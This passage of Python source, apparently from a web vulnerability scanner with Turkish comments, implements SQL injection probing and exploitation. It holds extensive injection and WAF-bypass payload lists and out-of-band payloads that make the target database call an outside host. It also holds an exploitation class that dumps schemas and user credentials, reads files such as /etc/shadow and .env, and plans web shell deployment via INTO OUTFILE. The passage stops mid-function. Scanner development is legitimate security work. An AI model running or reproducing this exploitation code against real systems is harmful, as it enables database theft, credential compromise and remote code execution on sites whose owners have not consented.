            for payload in self._SQLI_JSON_PROBES:
                probe_json = dict(base_json)
                probe_json[key] = payload
                t0 = time.time()
                try:
                    res = self.session.post(
                        url,
                        json=probe_json,
                        headers={"Content-Type": "application/json"},
                        timeout=12,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException as exc:
                    logger.debug(f"[SQLi/JSON] probe error {url}: {exc!r}")
                    continue

                new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
                if new_errors:
                    db = next(iter(new_errors))[0]
                    self.report_finding(
                        vuln_type="SQL Injection (JSON Body/Error)",
                        url=url,
                        param=key,
                        payload=payload,
                        severity="High",  # Error confirms injection, not data exfil
                        evidence=f"DB: {db} — JSON body injection",
                        detection_method="json_error",
                        confidence="high",
                    )
                    break  # one finding per key is enough

                if self._is_time_payload(payload) and elapsed > time_threshold:
                    self.report_finding(
                        vuln_type="SQL Injection (JSON Body/Time)",
                        url=url,
                        param=key,
                        payload=payload,
                        severity="Medium",  # Timing-based: weakest evidence
                        evidence=(
                            f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s "
                            f"(JSON body)"
                        ),
                        detection_method="json_time",
                        confidence="medium",
                    )
                    break

    # -------------------------------------------------------------------------
    # HTTP header injection
    # -------------------------------------------------------------------------

    _INJECTABLE_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "Referer",
        "User-Agent",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
    ]
    _HEADER_PROBES = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND SLEEP(3)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "1 AND 1=CONVERT(int,@@version)--",
    ]

    def _scan_header_injection(
        self,
        url: str,
        baseline_errors: set,
        time_threshold: float,
    ) -> None:
        """
        Inject SQLi payloads into common HTTP headers (X-Forwarded-For, Referer, etc.).
        Applications that log or DB-store request metadata are frequently vulnerable here.
        """
        for header in self._INJECTABLE_HEADERS:
            for payload in self._HEADER_PROBES:
                t0 = time.time()
                try:
                    res = self.session.get(
                        url,
                        headers={header: payload},
                        timeout=12,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException as exc:
                    logger.debug(f"[SQLi/Header] probe error {url} header={header}: {exc!r}")
                    continue

                new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
                if new_errors:
                    db = next(iter(new_errors))[0]
                    self.report_finding(
                        vuln_type="SQL Injection (Header/Error)",
                        url=url,
                        param=f"[Header] {header}",
                        payload=payload,
                        severity="High",  # Error confirms injection, not data exfil
                        evidence=f"DB: {db} — header injection via {header}",
                        detection_method="header_error",
                        confidence="high",
                    )
                    break

                if self._is_time_payload(payload) and elapsed > time_threshold:
                    self.report_finding(
                        vuln_type="SQL Injection (Header/Time)",
                        url=url,
                        param=f"[Header] {header}",
                        payload=payload,
                        severity="Medium",  # Timing-based: weakest evidence
                        evidence=(
                            f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s "
                            f"(header: {header})"
                        ),
                        detection_method="header_time",
                        confidence="medium",
                    )
                    break

    # -------------------------------------------------------------------------
    # OS Command Injection — FAZ 6.1: CmdiScanner'a delege edildi
    # -------------------------------------------------------------------------

    def scan_cmdi_url(self, url: str) -> bool:
        """
        OS Command Injection taraması.
        FAZ 6.1'de logic websecure.scanners.cmdi.CmdiScanner'a taşındı.
        Geriye dönük uyumluluk için bu metod hâlâ çağrılabilir.
        """
        try:
            from websecure.scanners.cmdi import CmdiScanner
            cmdi = CmdiScanner(
                session=self.session,
                results=self.results,
                debug=self.debug,
            )
            return cmdi.scan_url(url)
        except ImportError:
            logger.warning("[SQLi] cmdi modülü yüklenemedi, CMDI taraması atlanıyor")
            return False

    # --- Adım 3 — SQLInjectionScanner eklenti metodları ---------------------

    def _run_oob_phase(self, urls: List[str]) -> None:
        """OOB DNS SQLi via interactsh OAST. Callback doğrulaması async."""
        oob_host = "ws-oob.internal"
        try:
            # Prefer the global OAST poller's registered domain (has live interactsh session)
            from websecure.core.oast import get_oast_poller, OASTClient
            _poller = get_oast_poller()
            if _poller is not None:
                _cfg = getattr(getattr(_poller, "_client", None), "cfg", None)
                _domain = getattr(_cfg, "root_domain", "") if _cfg else ""
                if _domain:
                    oob_host = _domain
                else:
                    oob_host = OASTClient().get_host()
            else:
                oob_host = OASTClient().get_host()
        except Exception as _fix_e:
            logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")

        prober = OOBSQLiProber()
        for url in urls:
            parsed = urlparse(url)
            for param, _ in parse_qsl(parsed.query):
                sent = prober.probe(url, param, self.session, self.inject_param, oob_host)
                if sent:
                    self.report_finding(
                        vuln_type="SQL Injection (OOB DNS — Pending Callback)",
                        url=url,
                        param=param,
                        payload=sent[0]["payload"],
                        severity="High",
                        evidence=(
                            f"OOB payloads sent -> {oob_host}. "
                            f"Check OAST server for DNS/HTTP callbacks. "
                            f"Payloads tried: {len(sent)}"
                        ),
                        extra={"oob_host": oob_host, "payloads_sent": len(sent), "detection_method": "oob_dns", "confidence": "low"},
                    )
                    break  # one finding per URL is enough

    def _run_stacked_query_phase(self, urls: List[str]) -> None:
        """Stacked query (multi-statement) tespiti — time-based cross-validation."""
        prober = StackedQueryProber()
        for url in urls:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query)
            if not params:
                continue
            for param, _ in params:
                result = prober.probe(url, param, self.session, self.inject_param)
                if result:
                    payload, db_hint, evidence = result
                    self.report_finding(
                        vuln_type="SQL Injection (Stacked Query)",
                        url=url,
                        param=param,
                        payload=payload,
                        severity="Critical",
                        evidence=evidence,
                        extra={"db_hint": db_hint},
                        detection_method="stacked_query",
                        verified=True,
                        confidence="high",
                    )
                    # Schema extraction fırsatı: stacked query = arbitrary SELECT
                    self._run_schema_extraction(url, param, db_hint)

    def _run_schema_extraction(self, url: str, param: str, db_hint: str = "mysql") -> None:
        """Confirmed SQLi sonrası non-destructive DB şema çıkarımı."""
        extractor = SchemaExtractor()
        schema = extractor.run_schema_extraction(url, param, self.session, self.inject_param, db_hint)
        if schema.get("tables"):
            self.report_finding(
                vuln_type="SQL Injection — DB Schema Extracted",
                url=url,
                param=param,
                payload="UNION SELECT GROUP_CONCAT(table_name)",
                severity="Critical",
                evidence=(
                    f"Tables: {schema['tables'][:10]} | "
                    f"Sensitive tables: {schema['sensitive_tables']} | "
                    f"Columns: {schema['columns']}"
                ),
                extra={"schema": schema},
                detection_method="schema_extraction",
                verified=True,
                confidence="confirmed",
            )

    def _run_adaptive_scan(self, urls: List[str]) -> None:
        """WAF-aware adaptive scanning: polyglot payloads + variant mutation."""
        mutator = AdaptivePayloadMutator()
        for url in urls:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query)
            if not params:
                continue
            baseline = self.fetch_baseline(url, timeout=10)
            if not baseline:
                continue
            baseline_errors = self._extract_error_fingerprints(baseline.text)
            for param, _ in params:
                for payload in _POLYGLOT_SQLI_PAYLOADS[:15]:
                    result = mutator.send_adaptive(
                        url, self.session, param, payload, self.inject_param
                    )
                    if not result:
                        continue
                    variant, status_code, body = result
                    new_errors = self._extract_error_fingerprints(body) - baseline_errors
                    if new_errors:
                        db = next(iter(new_errors))[0]
                        self.report_finding(
                            vuln_type="SQL Injection (Adaptive/WAF Bypass)",
                            url=url,
                            param=param,
                            payload=variant,
                            severity="Critical",
                            evidence=f"WAF bypassed: {db} error via mutation — HTTP {status_code}",
                            detection_method="adaptive_waf_bypass",
                            confidence="high",
                        )
                        break

    def _run_sqlmap_bridge(self, url: str) -> None:
        """Confirmed bulgular için SQLMap CLI doğrulaması."""
        if not self.results.get("offensive"):
            return
        bridge = SQLMapBridge()
        if not bridge.is_available():
            logger.debug("[SQLi/SQLMap] sqlmap PATH'de bulunamadı, bridge atlanıyor")
            return
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return
        param = params[0][0]
        result = bridge.confirm(url, param)
        if result.get("success"):
            self.report_finding(
                vuln_type="SQL Injection (SQLMap Confirmed)",
                url=url,
                param=param,
                payload="sqlmap --technique=BEUST",
                severity="Critical",
                evidence=(
                    f"SQLMap bağımsız olarak doğruladı. "
                    f"Output dir: {result.get('output_dir')}"
                ),
                extra={"sqlmap": result},
                detection_method="sqlmap_confirmed",
                verified=True,
                confidence="confirmed",
            )

        # Full exploitation pipeline after SQLMap confirmation
        if result.get("success") and self.results.get("cfg", {}).get("exploitation", {}).get("enabled", True) is not False:
            exploiter = SQLiExploiter(session=self.session)
            exploit_report = exploiter.full_exploitation_pipeline(url, param)
            if exploit_report.get("credentials"):
                self.report_finding(
                    vuln_type="SQL Injection — Credentials Extracted",
                    url=url,
                    param=param,
                    payload="UNION SELECT user,password FROM users",
                    severity="Critical",
                    evidence=f"Extracted {len(exploit_report['credentials'])} credential(s): "
                             + str(exploit_report['credentials'][:3])[:400],
                    extra={"exploitation": exploit_report},
                    detection_method="sqli_exploiter",
                    verified=True,
                    confidence="confirmed",
                )
            if exploit_report.get("web_shell"):
                self.report_finding(
                    vuln_type="SQL Injection → Web Shell (RCE)",
                    url=url,
                    param=param,
                    payload="UNION SELECT shell INTO OUTFILE",
                    severity="Critical",
                    evidence=f"Web shell deployed: {exploit_report['web_shell']}",
                    extra={"shell_url": exploit_report["web_shell"], "exploitation": exploit_report},
                    detection_method="sqli_webshell",
                    verified=True,
                    confidence="confirmed",
                )


    # -------------------------------------------------------------------------
    # Second-order SQLi phase
    # -------------------------------------------------------------------------

    def _run_second_order_phase(self, urls: List[str]) -> None:
        """
        Adım 4a: Second-order (persistent) SQLi tespiti.

        Tüm URL'leri write endpoint, diğerlerini (+ kendisi) read endpoint olarak kullanır.
        Her URL'nin query parametrelerini ayrı ayrı dener.
        """
        if len(urls) < 1:
            return
        prober = SecondOrderSQLiProber()
        for i, write_url in enumerate(urls):
            parsed = urlparse(write_url)
            params = parse_qsl(parsed.query)
            if not params:
                continue
            # Read endpoints: diğer URL'ler + write URL'nin kendisi
            read_urls = [write_url] + [u for j, u in enumerate(urls) if j != i]
            for param_name, _ in params:
                result = prober.probe(
                    write_url=write_url,
                    read_urls=read_urls,
                    param=param_name,
                    session=self.session,
                    method="GET",
                )
                if result:
                    self.report_finding(
                        vuln_type="SQL Injection (Second-Order)",
                        url=write_url,
                        param=param_name,
                        payload=result.get("payload", ""),
                        severity="Critical",
                        evidence=result.get("evidence", ""),
                        extra={
                            "write_url": result.get("write_url"),
                            "read_url": result.get("read_url"),
                        },
                        detection_method="second_order_sqli",
                        verified=True,
                        confidence="confirmed",
                    )

    # -------------------------------------------------------------------------
    # Stored SQLi phase
    # -------------------------------------------------------------------------

    def _run_stored_sqli_phase(self, urls: List[str]) -> None:
        """
        Adım 4b: Stored SQLi tespiti — marker injection & reflection.

        Write endpoint'e unique marker inject eder, read endpoint'lerde
        unescaped yansımasını arar. SecondOrderSQLiProber'dan bağımsız: SQL
        hata imzası değil, marker string'inin ham yansıması aranır.
        """
        if len(urls) < 1:
            return
        prober = StoredSQLiProber()
        for i, write_url in enumerate(urls):
            parsed = urlparse(write_url)
            params = parse_qsl(parsed.query)
            if not params:
                continue
            read_urls = [write_url] + [u for j, u in enumerate(urls) if j != i]
            for param_name, _ in params:
                result = prober.probe(
                    write_url=write_url,
                    read_urls=read_urls,
                    param=param_name,
                    session=self.session,
                    method="GET",
                )
                if result:
                    self.report_finding(
                        vuln_type="SQL Injection (Stored/Reflected Marker)",
                        url=write_url,
                        param=param_name,
                        payload=result.get("payload", ""),
                        severity="High",
                        evidence=result.get("evidence", ""),
                        extra={
                            "write_url": result.get("write_url"),
                            "read_url": result.get("read_url"),
                        },
                        detection_method="stored_sqli_marker",
                        verified=True,
                        confidence="high",
                    )


def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = SQLInjectionScanner(session, results, debug)
    scanner.run(url)


# =============================================================================
# ADIM 3 — SQL Injection Üst Düzey: Standalone Bileşenler
# =============================================================================

# Polyglot SQLi payload seti: MySQL + MSSQL + Oracle + PostgreSQL + SQLite
# aynı anda etki eden payloadlar — WAF-aware adaptive scan için kullanılır.
_POLYGLOT_SQLI_PAYLOADS: List[str] = [
    # Evrensel hata tetikleyiciler
    "'", "\"", "`;",
    # MySQL error-based
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,user()),1)-- -",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    # MySQL time-based
    "' AND SLEEP(3)-- -",
    "' OR IF(1=1,SLEEP(3),0)-- -",
    # MSSQL error-based
    "' AND 1=CONVERT(int,@@version)-- -",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
    # MSSQL time-based
    "'; WAITFOR DELAY '0:0:3'-- -",
    # PostgreSQL error-based
    "' AND 1=CAST(version() AS int)-- -",
    # PostgreSQL time-based
    "' AND (SELECT pg_sleep(3))-- -",
    # Oracle
    "' AND 1=TO_NUMBER('x')-- -",
    "' UNION SELECT NULL,NULL FROM DUAL-- -",
    # SQLite
    "' AND 1=1-- -",
    "' UNION SELECT sqlite_version(),NULL-- -",
    # UNION-based (sütun sayısı brute-force)
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' ORDER BY 1-- -",
    "' ORDER BY 50-- -",
    # Boolean
    "' AND '1'='1-- -",
    "' OR ''='",
    "1 OR 1=1",
    "admin'--",
    # Stacked queries
    "'; SELECT 1-- -",
    "'; SELECT SLEEP(3)-- -",
    "'; WAITFOR DELAY '0:0:3'-- -",
]


class OOBSQLiProber:
    """
    Out-of-band DNS SQLi via OAST callback URL.

    MySQL:      LOAD_FILE(UNC path) -> DNS lookup
    MSSQL:      xp_dirtree / xp_fileexist -> DNS lookup
    Oracle:     UTL_HTTP.REQUEST -> HTTP callback
    PostgreSQL: COPY TO PROGRAM 'nslookup' -> DNS lookup

    Actual confirmation is async — check the OAST server for incoming requests.
    """

    _TEMPLATES: Dict[str, List[str]] = {
        "mysql": [
            "' AND LOAD_FILE(CONCAT('\\\\\\\\','{h}','.wsec\\\\x'))-- -",
            "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{h}',0x5c5c78))-- -",
        ],
        "mssql": [
            "'; EXEC master..xp_dirtree '//{h}/wsec'-- -",
            "'; EXEC master..xp_fileexist '//{h}/wsec'-- -",
        ],
        "oracle": [
            "' AND UTL_HTTP.REQUEST('http://{h}/wsec')='x'-- -",
            "' UNION SELECT UTL_HTTP.REQUEST('http://{h}/wsec') FROM DUAL-- -",
        ],
        "postgresql": [
            "'; CREATE TEMP TABLE _ws AS SELECT 1; COPY _ws TO PROGRAM 'nslookup {h}'-- -",
        ],
    }

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable,
        oob_host: str,
    ) -> List[Dict[str, Any]]:
        """
        Send all OOB payloads. Returns list of {db, payload} for each sent request.
        Caller must check OAST server separately for callback confirmation.
        """
        sent: List[Dict[str, Any]] = []
        for db, templates in self._TEMPLATES.items():
            for tpl in templates:
                payload = tpl.format(h=oob_host)
                injected = inject_fn(url, param, payload)
                try:
                    session.get(injected, timeout=10)
                    sent.append({"db": db, "payload": payload})
                except Exception as _fix_e:
                    logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        return sent


class StackedQueryProber:
    """
    Detects stacked query (multi-statement) SQLi via time-based confirmation.
    Uses non-destructive SLEEP / WAITFOR / pg_sleep payloads only.
    Multi-shot confirmation eliminates single-spike false positives.
    """

    _PAYLOADS: List[Tuple[str, str]] = [
        ("'; SELECT SLEEP(3)-- -",       "mysql"),
        ("'; WAITFOR DELAY '0:0:3'-- -", "mssql"),
        ("'; SELECT pg_sleep(3)-- -",    "postgresql"),
        ("||(SELECT SLEEP(3))||",        "mysql_concat"),
        ("'; SELECT 1-- -",              "generic"),
    ]

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable,
        time_threshold: float = 2.5,
        confirm_n: int = 2,
    ) -> Optional[Tuple[str, str, str]]:
        """Returns (payload, db_hint, evidence) or None."""
        for payload, db_hint in self._PAYLOADS:
            injected = inject_fn(url, param, payload)
            hits = 0
            for _ in range(confirm_n):
                t0 = time.time()
                try:
                    session.get(injected, timeout=time_threshold + 5)
                    if time.time() - t0 >= time_threshold:
                        hits += 1
                except _requests.exceptions.Timeout:
                    hits += 1
                except Exception as _fix_e:
                    logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
            if hits >= confirm_n:
                evidence = (
                    f"Stacked query confirmed ({hits}/{confirm_n} shots >= {time_threshold}s) "
                    f"— db_hint: {db_hint}"
                )
                return payload, db_hint, evidence
        return None


class SchemaExtractor:
    """
    Non-destructive DB schema extraction via UNION-based SQLi.
    Extracts table names -> column names for sensitive tables.
    Only uses SELECT queries — never modifies data.
    """

    _SENSITIVE_RE = re.compile(
        r"(?i)(user|account|admin|member|customer|password|passwd|secret|"
        r"credential|token|api_key|config|setting|session|auth|login|email)",
    )

    _TABLE_QUERIES: Dict[str, str] = {
        "mysql": (
            "' UNION SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR '|'),NULL "
            "FROM information_schema.tables WHERE table_schema=database()-- -"
        ),
        "mssql": (
            "' UNION SELECT STRING_AGG(table_name,'|'),NULL "
            "FROM information_schema.tables-- -"
        ),
        "postgresql": (
            "' UNION SELECT STRING_AGG(table_name,'|'),NULL "
            "FROM information_schema.tables WHERE table_schema='public'-- -"
        ),
        "oracle": (
            "' UNION SELECT LISTAGG(table_name,'|') WITHIN GROUP (ORDER BY table_name),NULL "
            "FROM all_tables WHERE ROWNUM<50-- -"
        ),
        "sqlite": (
            "' UNION SELECT GROUP_CONCAT(name,'|'),NULL "
            "FROM sqlite_master WHERE type='table'-- -"
        ),
    }

    _COLUMN_QUERIES: Dict[str, str] = {
        "mysql": (
            "' UNION SELECT GROUP_CONCAT(column_name ORDER BY column_name SEPARATOR '|'),NULL "
            "FROM information_schema.columns WHERE table_name='{t}'-- -"
        ),
        "mssql": (
            "' UNION SELECT STRING_AGG(column_name,'|'),NULL "
            "FROM information_schema.columns WHERE table_name='{t}'-- -"
        ),
        "postgresql": (
            "' UNION SELECT STRING_AGG(column_name,'|'),NULL "
            "FROM information_schema.columns WHERE table_name='{t}'-- -"
        ),
        "sqlite": (
            "' UNION SELECT GROUP_CONCAT(name,'|'),NULL "
            "FROM pragma_table_info('{t}')-- -"
        ),
    }

    def extract_tables(
        self, url: str, param: str, session: Any, inject_fn: Callable, db_hint: str = "mysql"
    ) -> List[str]:
        query = self._TABLE_QUERIES.get(db_hint, self._TABLE_QUERIES["mysql"])
        try:
            r = session.get(inject_fn(url, param, query), timeout=12)
            return list(dict.fromkeys(re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)))
        except Exception:
            return []

    def extract_columns(
        self, url: str, param: str, session: Any, inject_fn: Callable,
        table: str, db_hint: str = "mysql",
    ) -> List[str]:
        tmpl = self._COLUMN_QUERIES.get(db_hint, self._COLUMN_QUERIES["mysql"])
        try:
            r = session.get(inject_fn(url, param, tmpl.format(t=table)), timeout=12)
            return list(dict.fromkeys(re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)))
        except Exception:
            return []

    def run_schema_extraction(
        self, url: str, param: str, session: Any, inject_fn: Callable, db_hint: str = "mysql"
    ) -> Dict[str, Any]:
        tables = self.extract_tables(url, param, session, inject_fn, db_hint)
        sensitive = [t for t in tables if self._SENSITIVE_RE.search(t)]
        columns: Dict[str, List[str]] = {}
        for table in sensitive[:5]:  # en fazla 5 hassas tablo
            cols = self.extract_columns(url, param, session, inject_fn, table, db_hint)
            if cols:
                columns[table] = cols
        return {"tables": tables, "sensitive_tables": sensitive, "columns": columns}


class SecondOrderSQLiProber:
    """
    Second-order (persistent) SQLi tespiti.

    Phase 1: Write endpoint'e dormant payload depola.
    Phase 2: Read/process endpoint'te SQL hata imzası ara.
    Farklı kod yolunda tetiklenen injection'ları yakalar.
    """

    _DORMANT: List[str] = [
        "ws_so_{uid}'",
        "ws_so_{uid}\"",
        "ws_so_{uid}' OR '1'='1",
        "ws_so_{uid}' AND 1=1-- -",
        "ws_so_{uid}'; SELECT 1-- -",
    ]

    _ERROR_PATTERNS: List[str] = [
        r"SQL syntax", r"ORA-\d{4}", r"PostgreSQL.*ERROR",
        r"SQLITE_ERROR", r"Unclosed quotation", r"mysql_fetch",
        r"Warning.*mysql", r"syntax error.*unexpected",
    ]

    def probe(
        self,
        write_url: str,
        read_urls: List[str],
        param: str,
        session: Any,
        method: str = "POST",
    ) -> Optional[Dict[str, Any]]:
        import uuid as _uuid
        uid = _uuid.uuid4().hex[:8]

        for tpl in self._DORMANT:
            payload = tpl.format(uid=uid)
            try:
                if method.upper() == "POST":
                    session.post(write_url, data={param: payload}, timeout=10)
                else:
                    session.get(write_url, params={param: payload}, timeout=10)
            except Exception:
                continue

            for read_url in read_urls:
                try:
                    r = session.get(read_url, timeout=10)
                    for pat in self._ERROR_PATTERNS:
                        if re.search(pat, r.text, re.I):
                            return {
                                "write_url": write_url,
                                "read_url": read_url,
                                "param": param,
                                "payload": payload,
                                "evidence": f"Second-order SQLi: pattern '{pat}' triggered at {read_url}",
                            }
                except Exception as _fix_e:
                    logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        return None


class StoredSQLiProber:
    """
    Stored SQLi: inject unique string marker at write endpoint,
    check for unescaped reflection at read endpoints.
    Distinct from SecondOrderSQLiProber: focuses on marker reflection, not SQL errors.
    """

    _MARKERS: List[str] = [
        "ws_stored_{uid}'",
        "ws_stored_{uid}\"",
        "ws_stored_{uid}",
    ]

    def probe(
        self,
        write_url: str,
        read_urls: List[str],
        param: str,
        session: Any,
        method: str = "POST",
    ) -> Optional[Dict[str, Any]]:
        import uuid as _uuid
        uid = _uuid.uuid4().hex[:8]
        raw_marker = f"ws_stored_{uid}"

        for tpl in self._MARKERS:
            marker_val = tpl.format(uid=uid)
            try:
                if method.upper() == "POST":
                    session.post(write_url, data={param: marker_val}, timeout=10)
                else:
                    session.get(write_url, params={param: marker_val}, timeout=10)
            except Exception:
                continue

            for read_url in read_urls:
                try:
                    r = session.get(read_url, timeout=10)
                    if raw_marker in r.text:
                        return {
                            "write_url": write_url,
                            "read_url": read_url,
                            "param": param,
                            "payload": marker_val,
                            "evidence": f"Stored SQLi: marker '{raw_marker}' unescaped at {read_url}",
                        }
                except Exception as _fix_e:
                    logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        return None


class AdaptivePayloadMutator:
    """
    WAF-aware adaptive payload mutation.
    When a request returns WAF block codes (400/403/406/429),
    automatically generates 8 variant forms and retries.
    """

    _BLOCK_CODES: frozenset = frozenset({400, 403, 406, 429})

    def send_adaptive(
        self,
        url: str,
        session: Any,
        param: str,
        payload: str,
        inject_fn: Callable,
        timeout: int = 10,
    ) -> Optional[Tuple[str, int, str]]:
        """Try payload + variants. Returns (effective_payload, status, body) or None."""
        for variant in self._variants(payload):
            injected = inject_fn(url, param, variant)
            try:
                r = session.get(injected, timeout=timeout)
                if r.status_code not in self._BLOCK_CODES:
                    return variant, r.status_code, r.text
            except Exception as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        return None

    def _variants(self, payload: str) -> List[str]:
        v = [payload]

        # 1. SQL keyword case swap
        swapped = payload
        for kw in ("SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "SLEEP", "WAITFOR", "ORDER", "BY"):
            swapped = swapped.replace(kw, kw.swapcase())
        v.append(swapped)

        # 2. Inline comment injection between whitespace
        v.append(re.sub(r' ', '/**/', payload))

        # 3. URL encode special chars
        v.append(payload.replace("'", "%27").replace('"', "%22").replace(" ", "%20"))

        # 4. Double URL encode
        v.append(payload.replace("'", "%2527").replace('"', "%2522").replace(" ", "%2520"))

        # 5. Newline-as-space (bypasses space filters)
        v.append(payload.replace(" ", "\n"))

        # 6. Tab-as-space
        v.append(payload.replace(" ", "\t"))

        # 7. MySQL scientific notation for numeric literals
        v.append(re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0", payload))

        # 8. Hex-encode short string literals inside single quotes
        def _hex_str(s: str) -> str:
            return re.sub(
                r"'([^']{1,20})'",
                lambda m: f"0x{m.group(1).encode().hex()}",
                s,
            )
        v.append(_hex_str(payload))

        return v


class SQLMapBridge:
    """
    SQLMap CLI entegrasyonu: WebSecure tespit edilen SQLi'yi bağımsız olarak doğrular.
    Sadece onaylanan bulgular için çağrılır.
    Non-destructive: --technique=BEUST, --level=1, --risk=1, --batch.
    """

    _CMD = "sqlmap"
    _TIMEOUT = 120

    def is_available(self) -> bool:
        import shutil
        return shutil.which(self._CMD) is not None

    def confirm(
        self,
        url: str,
        param: str,
        output_dir: Optional[str] = None,
        extra_args: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """SQLMap çalıştır ve sonucu döndür."""
        if not self.is_available():
            return {"success": False, "error": "sqlmap PATH'de bulunamadı"}

        import subprocess as _sp
        import tempfile

        out_dir = output_dir or tempfile.mkdtemp(prefix="ws_sqlmap_")
        cmd = [
            self._CMD,
            "-u", url,
            "-p", param,
            "--batch",
            "--level=1",
            "--risk=1",
            "--technique=BEUST",
            f"--output-dir={out_dir}",
        ]
        if extra_args:
            cmd.extend(extra_args)

        try:
            proc = _sp.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self._TIMEOUT,
                check=False,
            )
            stdout = proc.stdout or ""
            confirmed = (
                "sqlmap identified" in stdout.lower()
                or "parameter appears to be" in stdout.lower()
                or "is vulnerable" in stdout.lower()
            )
            return {
                "success": confirmed,
                "returncode": proc.returncode,
                "output": stdout[:3000],
                "output_dir": out_dir,
            }
        except _sp.TimeoutExpired:
            return {"success": False, "error": f"sqlmap {self._TIMEOUT}s'de zaman aşımı"}
        except Exception as exc:
            return {"success": False, "error": str(exc)}


# =============================================================================
# SQLiExploiter — Full SQLi Exploitation Pipeline
# =============================================================================

class SQLiExploiter:
    """
    Full SQLi exploitation pipeline — runs after confirmed detection.

    Modes (escalating):
    1. dump_schema() — enumerate databases, tables, columns
    2. dump_credentials() — dump user/password tables directly
    3. attempt_os_shell() — escalate to OS command execution via SQLMap
    4. attempt_file_write() — write web shell to filesystem (MySQL INTO OUTFILE)
    5. attempt_file_read() — read sensitive files (/etc/passwd, wp-config.php, .env)

    Uses SQLMap CLI as the execution engine where available.
    Also implements direct UNION-based extraction as fallback.

    SOLID: Single Responsibility — exploitation only (detection is SQLInjectionScanner's job)
    """

    _SENSITIVE_TABLES = re.compile(
        r'(?i)(user|account|admin|member|customer|employee|staff|'
        r'password|credential|auth|login|token|secret|api_key|session|'
        r'oauth|payment|credit|billing|personal|private)'
    )

    _FILE_TARGETS = [
        "/etc/passwd",
        "/etc/shadow",
        "/var/www/html/.env",
        "/var/www/html/wp-config.php",
        "/var/www/html/config/database.php",
        "/var/www/html/config/database.yml",
        "/var/www/html/settings.py",
        "/var/www/html/config.php",
        "C:/Windows/win.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/xampp/htdocs/.env",
    ]

    def __init__(self, session=None, timeout: int = 120):
        import requests as _req
        self.session = session or _req.Session()
        self.timeout = timeout

    @staticmethod
    def _inject_fn(url: str, param: str, payload: str) -> str:
        """Build injection URL by replacing the target parameter value."""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param] = payload
        return urlunparse(parsed._replace(query=urlencode(params)))

    def dump_schema(self, url: str, param: str, db_hint: str = "mysql") -> Dict[str, Any]:
        """
        Extract complete DB schema via UNION-based injection.

        Returns:
            {
                "databases": [...],
                "tables": [...],
                "sensitive_tables": [...],
                "columns": {table: [cols]},
            }
        """
        extractor = SchemaExtractor()
        schema = extractor.run_schema_extraction(url, param, self.session, self._inject_fn, db_hint)

        # Enumerate all databases (MySQL/MariaDB/PostgreSQL)
        databases: List[str] = []
        if db_hint in ("mysql", "mariadb"):
            db_query = (
                "' UNION SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR '|'),NULL "
                "FROM information_schema.schemata-- -"
            )
            try:
                r = self.session.get(self._inject_fn(url, param, db_query), timeout=10)
                databases = re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)
            except Exception as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")

        schema["databases"] = databases or schema.get("tables", [])
        return schema

    def dump_credentials(
        self, url: str, param: str, db_hint: str = "mysql"
    ) -> List[Dict[str, str]]:
        """
        Directly extract username/password from sensitive tables.

        Strategy:
        1. Obtain schema to identify sensitive tables.
        2. For each sensitive table, detect username/password column names via regex.
        3. Extract up to 50 rows per table via UNION SELECT.

        Returns:
            [{"table": "users", "username": "admin", "password": "hash", "url": "..."}]
        """
        results: List[Dict[str, str]] = []
        schema = self.dump_schema(url, param, db_hint)

        for table in schema.get("sensitive_tables", [])[:5]:
            cols = schema.get("columns", {}).get(table, [])
            if not cols:
                continue

            # Identify user/pass columns heuristically
            user_col = next(
                (c for c in cols if re.search(r'(?i)user|login|email|name', c)), None
            )
            pass_col = next(
                (c for c in cols if re.search(r'(?i)pass|hash|secret|token', c)), None
            )

            if not user_col or not pass_col:
                continue

            # Build dump query per DB dialect
            if db_hint in ("mysql", "mariadb"):
                query = (
